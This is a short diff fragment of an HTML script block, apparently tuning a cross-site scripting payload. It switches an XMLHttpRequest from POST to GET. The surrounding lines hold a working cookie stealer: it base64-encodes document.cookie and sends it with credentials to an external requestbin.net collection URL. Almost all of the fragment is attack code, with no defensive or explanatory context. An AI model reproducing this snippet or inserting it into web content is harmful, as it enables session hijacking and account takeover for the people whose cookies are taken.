@@ -12,7 +12,7 @@
 <script type="text/javascript">
 var theUrl = 'http://requestbin.net/r/1iksjrn1'+ '?cookie='+ btoa(document.cookie);
 var xhr = new XMLHttpRequest()
-        xhr.open('POST', theUrl, true)
+        xhr.open('GET', theUrl, true)
         xhr.withCredentials = true
         xhr.onreadystatechange = function() {
           if (xhr.readyState === 2) {
